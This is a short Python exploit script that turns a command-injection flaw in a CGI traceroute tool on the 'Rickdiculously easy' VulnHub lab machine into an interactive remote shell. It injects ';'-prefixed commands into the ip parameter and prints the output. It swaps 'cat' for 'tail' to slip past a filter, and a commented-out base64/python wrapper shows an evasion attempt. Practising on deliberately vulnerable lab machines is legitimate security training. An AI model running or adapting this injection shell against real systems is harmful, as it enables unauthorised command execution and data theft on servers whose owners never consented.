# Small script to exploit command injection on the
# Rickdiculosly easy vulnhub machine
import requests
import urllib.parse
import sys
import os
import base64

url = "http://192.168.254.68/cgi-bin/tracertool.cgi?ip="
path = ""

def filterResp(response):
	top      = response.text.find("<pre>")
	bottom   = response.text.find("</pre>")
	return response.text[top+6:bottom-1]

while True:
	try:
		cmd = input("-> ")
	except:
		print()
		sys.exit(0)

	# This could totally be done better, but this is the fastest for now
	# just a bunch of custom commands :l
	if cmd == "clear":
		if sys.platform == "win32" or sys.platform == "win64":
			os.system("cls")
		else:
			os.system("clear")
		continue
	elif cmd == "exit" or cmd == "q":
		sys.exit(0)
	elif len(cmd) > 3 and cmd[0:2] == "cd":
		path = path + cmd[3:] + "/"
		#print("Virtual path is now %s" %(path))
		continue
	elif len(path) > 1 and len(cmd) > 3 and cmd[0:2] == "ls":
		cmd = cmd + " " + path + cmd[3:]

	elif cmd == "ls":
		cmd = cmd + " " + path
	elif cmd == "cd":
		path = ""
		continue
	elif len(cmd) > 4 and cmd[0:3] == "cat":
		cmd = "tail -9999 "+ path + cmd[4:]
	elif cmd == "cat":
		print("Usage: cat <file>")
		continue
	elif cmd == "pwd":
		print("Virtual path is %s" % (path))
		continue
	elif cmd[0:3] == "raw":
		print(filterResp(requests.get( url+cmd[3:])))
		continue

	# pipe was not working so i tried this then gave up
	#cmd      = base64.b64encode(cmd.encode()).decode("UTF-8")
	#print("encoded cmd = %s" % (cmd))
	#cmd = """python3.6 -c "from os import system as s;from base64 import b64decode as d;s(d(b'%s'))\"""" % (cmd)

	# Make the request
	cmd = ";"+cmd
	request  = (url + urllib.parse.quote_plus(cmd))
	response = requests.get(request)

	# now we filter it and then print
	print(filterResp(response))
